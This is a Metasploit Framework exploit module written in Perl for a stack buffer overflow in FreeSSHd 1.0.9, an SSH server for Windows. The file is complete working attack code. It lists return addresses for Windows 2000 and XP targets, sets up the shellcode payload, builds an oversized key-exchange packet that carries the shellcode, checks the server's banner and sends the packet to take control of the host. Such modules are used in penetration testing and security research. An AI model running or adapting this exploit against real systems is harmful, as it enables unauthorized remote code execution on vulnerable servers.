
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::freesshd_key_exchange;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 22],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'Payload' =>
	  {
		'Space'     => 500,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
     	This module exploits a simple stack overflow in FreeSSHd 1.0.9.
	This flaw is due to a buffer overflow error when handling a specially 
	crafted key exchange algorithm string received from an SSH client,  
}),

	'Refs'  =>
	  [
		['BID', '17958'],
	  ],
	'Targets' =>
	  [
		['Windows 2000 SP4 English',   0x77e56f43],
		['Windows XP Pro SP0 English', 0x77e51877],
		['Windows XP Pro SP1 English', 0x77e53877],
	  ],

	'Keys' => ['ssh'],

	'DisclosureDate' => 'May 12 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	my $sploit =
	  "SSH-2.0-OpenSSH_3.9p1".
	  "\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00\x00\x00".
	  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde".
	  Pex::Text::AlphaNumText(1055). pack('V', $target->[1]).
	  $shellcode. Pex::Text::AlphaNumText(19000). "\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $resp = $s->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] FreeSSHD: ' . $resp);

	if($resp !~ /SSH-2\.0-WeOnlyDo 1\.2\.7/) {
		$self->PrintLine('[*] Not a FreeSSHD service... ');
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}
1;

